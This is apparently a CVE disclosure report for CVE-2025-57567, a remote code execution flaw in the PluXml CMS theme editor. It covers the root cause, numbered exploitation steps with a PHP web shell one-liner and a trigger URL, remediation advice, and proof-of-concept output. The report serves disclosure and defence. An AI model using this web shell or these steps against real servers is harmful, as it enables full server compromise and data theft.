# CVE-2025-57567 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-57567
- **CWE**: CWE-94 (Improper Control of Generation of Code)
- **Affected Software**: PluXml CMS
- **Affected Version**: 5.8.17 - 5.8.20 (versions containing minify.php)
- **Vulnerability Type**: Remote Code Execution (RCE)

## Description

A remote code execution (RCE) vulnerability exists in the PluXml CMS theme editor, specifically in the minify.php file located under the default theme directory (/themes/defaut/css/minify.php). An authenticated administrator user can overwrite this file with arbitrary PHP code via the admin panel, enabling execution of system commands.

## Root Cause Analysis

The vulnerability exists in `core/admin/parametres_edittpl.php`:

```php
if(isset($_POST['submit']) AND trim($_POST['content']) != '') {
    if(plxUtils::write($_POST['content'], $filename))
        plxMsg::Info(L_SAVE_FILE_SUCCESSFULLY);
    else
        plxMsg::Error(L_SAVE_FILE_ERROR);
}
```

The code allows administrators to write arbitrary content to PHP files in theme directories without any content validation or sanitization. The minify.php file (added in v5.8.17) is directly accessible via web, making it an ideal target for code injection.

## Exploitation Steps

1. Login to PluXml admin panel with administrator credentials
2. Navigate to Parameters > Theme Editor (`/core/admin/parametres_edittpl.php`)
3. Select the template file `css/minify.php`
4. Replace the content with malicious PHP code:
   ```php
   <?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); exit; } ?>
   ```
5. Save the template
6. Access the modified minify.php file directly:
   ```
   http://target/themes/defaut/css/minify.php?cmd=id
   ```

## Impact

- Remote code execution on the server
- Complete server compromise
- Data theft and manipulation
- Potential lateral movement within the network

## Remediation

1. Implement content validation to block PHP code in template files
2. Restrict direct web access to PHP files in theme directories
3. Use a whitelist of allowed template content
4. Implement Web Application Firewall (WAF) rules

## PoC Verification Result

```
============================================================
CVE-2025-57567 - PluXml Theme Editor RCE PoC
============================================================
[+] Login successful
[+] Payload injected into css/minify.php
[+] RCE successful!
[+] Command output:
uid=33(www-data) gid=33(www-data) groups=33(www-data)

[+] Vulnerability confirmed!
```
